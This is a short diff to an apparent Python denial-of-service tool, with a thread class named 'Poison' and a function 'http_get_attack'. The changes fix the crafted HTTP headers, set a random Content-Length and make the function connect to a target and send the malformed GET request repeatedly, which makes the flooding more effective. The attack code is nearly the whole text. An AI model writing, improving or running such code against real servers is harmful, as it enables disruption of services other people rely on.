@@ -21,23 +21,23 @@ class Poison (threading.Thread):
             http_get_attack(sock, url, port)
         else:
             sock.connect((url, port))
-
         time.sleep(1)
         sock.close()
 
-def http_get_attack(sock, url_string, port):
+def http_get_attack(sock, url, port):
     headers = [
-        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
-        "Content-Length: {}".format(random.randint(0, 0))
+        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
+        "Content-Length: {}".format(random.randint(1024, 2048))
     ]
     message = "GET / HTTP/1.1\n"
 
-    data = message + "\n".join(headers)
+    data = message + "\n".join(headers) + "\n\n"
 
     try:
-        sock.connect((url_string, port))
+        sock.connect((url, port))
         for header in headers:
             sock.send(data.encode("utf-8"))
+
     except Exception as e:
         print("Error:", e)
 
